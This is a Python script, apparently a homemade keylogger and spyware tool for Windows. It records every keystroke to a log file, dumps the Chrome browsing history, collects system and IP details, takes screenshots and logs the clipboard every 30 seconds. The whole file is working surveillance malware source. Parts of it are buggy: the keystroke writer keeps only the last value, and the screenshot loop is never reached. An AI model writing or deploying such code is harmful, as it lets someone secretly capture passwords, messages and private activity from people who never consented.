import time
import win32clipboard
import datetime
import pynput
from pynput.keyboard import Key, Listener
import sqlite3
import datetime
import socket
import platform
import pandas as pd
import ImageGrab

#gets the computer information and store it in text file
date = datetime.date.today()
ip_address = socket.gethostbyname(socket.gethostname())
processor = platform.processor()
system = platform.system()
release = platform.release()
host_name = socket.gethostname()

# Create a DataFrame with computer information
data = {
    'Metric': ['Date', 'IP Address', 'Processor', 'System', 'Release', 'Host Name'],
    'Value': [date, ip_address, processor, system, release, host_name]
}

# Save the DataFrame to an Excel file
df = pd.DataFrame(data)
df.to_excel('computer_information.xlsx', index=False)

#get history of google chrome
# Connect to the Google Chrome history database
conn = sqlite3.connect('C:\\Users\\admin\\Desktop\\History')  # add your path
cursor = conn.cursor()

# Retrieve search history from the database accordingly
cursor.execute("SELECT url, title, datetime((last_visit_time/1000000)-11644473600, 'unixepoch', 'localtime') AS last_visit_time FROM urls")
search_history = cursor.fetchall()

# Create a pandas DataFrame from the retrieved search history
df = pd.DataFrame(search_history, columns=['url', 'title', 'Timestamp'])

# Save the search history DataFrame to an Excel file
excel_file = "search_history.xlsx"
df.to_excel(excel_file, index=False)

# Close the database connection
conn.close()

k = []

def on_press(key):
    k.append(key)
    current_date = datetime.datetime.now()
    write_file([current_date, key])
    print(key)

def write_file(var):
    with open("logs.txt", "a") as f:
        for i in var:
            new_var = str(i).replace("'", "")
        f.write(new_var)
        f.write(" ")

def on_release(key):
    if key == Key.esc:
        return False

# Start the keystroke listener
listener = Listener(on_press=on_press, on_release=on_release)
listener.start()

#get the screenshot
def screenshot():
    try:
        im = ImageGrab.grab()
        im.save("screenshot.png")
        print("Screenshot saved successfully!")
    except Exception as e:
        print(f"Error saving screenshot: {e}")

screenshot()


# Copy clipboard data every 30 seconds
def copy_clipboard():
    current_date = datetime.datetime.now()
    with open("clipboard.txt", "a") as f:
        
        win32clipboard.OpenClipboard()
        pasted_data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()

        f.write("\n")
        f.write("date and time:"+ str(current_date)+"\n")
        f.write("clipboard data: \n "+ pasted_data)

while True:
    copy_clipboard()
    time.sleep(30) # wait for 30 seconds before copying again

# take a screenshot every 10 seconds
while True:
    screenshot()
    time.sleep(10)
